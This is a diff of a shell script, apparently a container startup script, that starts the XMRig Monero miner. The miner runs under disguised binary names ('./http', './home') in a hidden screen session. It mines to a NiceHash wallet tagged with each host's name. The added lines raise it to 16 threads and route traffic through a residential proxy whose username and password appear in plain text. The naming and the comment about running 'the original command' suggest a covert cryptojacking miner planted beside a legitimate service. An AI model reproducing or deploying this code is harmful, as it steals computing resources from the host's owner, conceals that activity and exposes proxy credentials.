@@ -16,7 +16,15 @@ cd /nginx/homepage
 
 # Run XMRig with screen, using taskset to set CPU affinity and cpulimit to limit CPU usage
 #screen -dmS http_session sh -c "taskset -c 4,6,10,11 cpulimit -l 80 -- ./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
-screen -dmS http_session sh -c "./home -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash"
+screen -dmS http_session sh -c "./home \
+-a randomx \
+-o stratum+tcp://randomxmonero.auto.nicehash.com:9200 \
+-u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} \
+-p x \
+-k \
+--nicehash \
+--threads=16 \
+--proxy=http://mohfreestyl-zone-resi-session-f91c83cbdd9d-sessTime-120:20242024@7372f7b899aa6f42.yiu.us.ip2world.vip:6001"
 
 # Change directory to /app and run the original command in the background
 # cd /app
